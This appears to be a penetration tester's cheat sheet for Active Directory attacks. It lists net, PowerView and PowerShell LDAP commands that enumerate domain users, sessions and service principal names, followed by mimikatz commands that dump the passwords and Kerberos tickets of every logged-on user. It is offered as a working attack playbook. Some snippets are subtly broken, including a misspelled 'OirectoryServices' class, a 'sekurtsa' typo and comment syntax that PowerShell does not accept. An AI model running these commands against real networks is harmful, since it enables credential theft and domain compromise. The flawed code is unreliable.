## Active Directory

* Enumerate users and groups

```
net user /domain
net user jeff_admin /domain
net group /domain
```

* Domain controller information

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

* Enumerate Logged on Users

```
Import-Module .\PowerView.ps1

// logged in users on local desktop
Get-NetLoggedon -ComputerName client251

// active sessions on DC
Get-NetSession -ComputerName dc01
```

* Enumerate SPNs to find registered services ip and port

Change `Searcher.filter` accordingly

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain] ::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher= New-Object System.OirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter= "serviceprincipalname=*http*"

$Result= $Searcher.FindAll()

Foreach($obj in $Result)
{
Foreach($prop in $obj.Properties)
{
$prop
}
}
```

* Dump password hashes stored locally

```
mimikatz.exe
mimikatz# privilege::debug

// dump the credentials of all logged-on users
mimikatz# sekurlsa::logonpasswords

// dump TGT and TGS tickets of all logged on users
sekurtsa::tickets
```